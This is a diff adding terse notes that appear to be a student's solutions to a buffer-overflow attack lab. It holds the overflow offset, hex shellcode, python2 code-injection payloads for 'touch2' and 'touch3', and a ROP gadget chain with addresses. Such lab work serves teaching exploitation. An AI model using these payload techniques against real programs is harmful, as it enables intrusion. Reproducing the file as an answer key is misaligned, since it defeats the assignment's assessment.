@@ -1,0 +1,25 @@
+a7 1d 40
+
+72 chars to overflow to ret address
+\x48\x89\x3C\x25\x00\x00\x00\x00\xC3 - 9 chars
+0x55652768 - location of buffer
+72-9 = 63
+
+touch2 Solution
+r <<< $(python2 -c "print '\x90'*50 + '\x48\xC7\xC7\x3A\x4E\xDB\x47\x68\xDB\x1D\x40\x00\xC3' + '\x90'*9 + '\x70\x27\x65\x55'")
+
+touch3 Solution r <<<
+ $(python2 -c "print '47db4e3a\x00' + '\x90'*42 + '\x48\xC7\xC7\x68\x27\x65\x55\x68\x00\x1F\x40\x00\xC3'  + '\x90'*8 + '\x79\x27\x65\x55'")
+
+buffer '\x90'*72 
+mov rsp, rax    '\xfe\x20\x40' + '\x00'*5 
+mov rax, rdi     '\xbf\x1f\x40' + '\x00'*5 
+popq rax          '\xec\x1f\x40' + '\x00'*5 
+offset                '\x48' + '\x00'*7 
+mov eax ecx     '\x28\x20\x40' + '\x00'*5 
+mov ecx edx     '\xdd\x20\x40' + '\x00'*5 
+mov edx, esi     '\x09\x21\x40' + '\x00'*5 
+add_xy              '\x0f\x20\x40' + '\x00'*5 
+mov rax, rdi       '\xbf\x1f\x40' + '\x00'*5 
+touch3              '\x00\x1f\x40' + '\x00'*5 
+cookie               '47db4e3a'     + '\x00'*8
